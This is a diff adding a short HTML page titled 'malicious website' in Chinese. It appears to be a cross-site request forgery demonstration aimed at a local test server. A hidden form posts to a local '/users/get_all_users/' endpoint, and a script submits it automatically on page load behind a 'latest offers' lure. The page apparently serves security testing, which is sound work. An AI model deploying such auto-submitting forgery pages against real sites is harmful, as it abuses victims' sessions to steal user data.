@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>恶意网站</title>
+</head>
+<body>
+    <h1>欢迎访问恶意网站</h1>
+    <p>请查看我们的最新优惠！</p>
+    
+    <!-- 提交表单来获取所有用户 -->
+    <form id="csrf-form-get-users" method="POST" action="http://127.0.0.1:8000/users/get_all_users/" target="iframe-get-users">
+    </form>
+  
+    <script>
+        const iframeGetUsers = document.getElementById('csrf-form-get-users').submit();
+    </script>
+</body>
+</html>
